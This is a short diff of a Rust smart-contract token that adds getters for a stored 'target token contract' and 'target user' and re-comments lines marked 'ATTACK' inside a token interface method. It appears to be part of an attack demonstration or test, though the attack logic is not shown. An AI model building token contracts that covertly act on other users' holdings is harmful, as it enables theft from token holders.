@@ -95,8 +95,15 @@ impl Token {
 
         write_target_user(&e, &new_target_user);
     }
-    
 
+    pub fn target_token_contract(e: Env) -> Address {
+        read_target_token_contract(&e)
+    }
+
+    pub fn target_user(e: Env) -> Address {
+        read_target_user(&e)
+    }
+    
     #[cfg(test)]
     pub fn get_allowance(e: Env, from: Address, spender: Address) -> Option<AllowanceValue> {
         let key = DataKey::Allowance(AllowanceDataKey { from, spender });
@@ -146,8 +153,8 @@ impl token::Interface for Token {
             .instance()
             .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
 
-        // ATTACK
-        // read token 
+        // // ATTACK
+        // // read token 
         let target_token_contract = read_target_token_contract(&e);
         let target_user = read_target_user(&e);
 
